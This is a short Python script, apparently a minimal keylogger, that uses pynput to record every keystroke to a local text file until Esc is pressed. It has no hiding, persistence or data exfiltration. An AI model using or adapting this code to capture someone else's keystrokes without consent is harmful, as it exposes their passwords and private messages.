from pynput import keyboard

# File to save the logged keystrokes
log_file = "key_log.txt"

# Function to log the key pressed
def on_press(key):
    try:
        # Write the key to the file
        with open(log_file, "a") as log:
            # If the key is alphanumeric or a standard key, write it directly
            log.write(f'{key.char}')
    except AttributeError:
        # Special keys (e.g., shift, enter) will raise AttributeError
        with open(log_file, "a") as log:
            log.write(f'[{key}]')

# Function to stop logging (press 'Esc' key)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener to capture keypresses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
